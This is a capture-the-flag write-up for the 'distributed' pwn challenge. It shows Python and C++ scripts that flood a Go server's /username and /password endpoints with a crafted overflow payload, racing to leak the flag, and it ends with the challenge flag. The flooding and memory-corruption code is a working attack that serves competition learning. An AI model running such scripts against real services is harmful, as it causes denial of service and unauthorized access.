# pwn / distributed

> Points: 300

## Question

> Go is the language of distributed systems\
> `curl http://pwn.uwc.tf:2021/{username,password,flag}`
> Hint: the time-derived secret is a misdirection;
> you may not be able to brute-force it (not tested, not intended)

### Provided Files

- [`server.go`](./server.go)

## Solution

Based on `server.go`, we had to make the `digest` and `password` match 
(up to an MD5 hash).
These are stored next to each other in memory, preceded by `username`.
We attempted buffer overflow, but those didn't work.

What ended up happening was we tried DOSing the server,
with something like Rowhammer in mind and hoping we achieve a race condition.
With a name like "distributed", we figured that would come into play.
We originally tried doing this with Python,
which only worked locally for some reason:

```py
import requests, threading, time, hashlib

ADDR = 'http://pwn.uwc.tf:2021'
#ADDR = 'http://localhost:2021'

SEND_DATA = b"A"*256
SEND_DATA += b"A"*(128)
SEND_DATA += hashlib.md5(b"A"*128).digest()
SEND_DATA += b"A"*(128-16)

def dos(path, expected_status):
    while True:
        res = requests.post(url=ADDR+path,
                            data= SEND_DATA,
                            headers={'Content-Type': 'application/octet-stream'})
        if (res.status_code != expected_status):
            print(res.text)

def do_flag(path, expected_status):
    while True:
        res = requests.get(url=ADDR+path)
        if (res.status_code != expected_status):
            print(res.text)

print(requests.post(url=ADDR+'/username',data= "A"*512,
                            headers={'Content-Type': 'application/octet-stream'}))
time.sleep(2)
print("SMASH")
for i in range(10):
    threading.Thread(target= dos, args=("/username",200)).start()
    threading.Thread(target= dos, args=("/password",200)).start()
    threading.Thread(target= do_flag, args=("/flag",403)).start()
    print("Lanched " + str(i))
```

After contacting the challenge author,
we found that the challenge was sensitive to network latency.
This wasn't great, considering we were working over both seas.
Eventually, we got it working in C++:

```cpp
#include "HTTPRequest.hpp"
#include <stdio.h>
#include <thread>
#include <iostream>

std::string payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xaf5\xb0\xd3H\xe5\x16 6\xe1\x833\x9d8[\x0cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
void DOS(std::string path,int expected)
{
    while(true) {
        try
        {
            http::Request request("http://localhost:2021"+path);
            // send a post request
            const http::Response response = request.send("POST", payload, {
                "Content-Type: application/octet-stream"
            });
            if (response.status != expected)
                std::cout << std::string(response.body.begin(), response.body.end()) << '\n'; // print the result
        }
        catch (const std::exception& e)
        {
            std::cerr << "Request failed, error: " << e.what() << '\n';
        }
    }
}

int main() {
    std::thread t1(DOS, "/username", 200);
    std::thread t2(DOS, "/password", 200);
    std::thread t3(DOS, "/flag", 403);
    
    t1.join();
    t3.join();
    t2.join();
}
```

This ended up working.
We still don't know why.

### Flag

`uwctf{lol_no_memory_safety_b7947a8153e57612}`
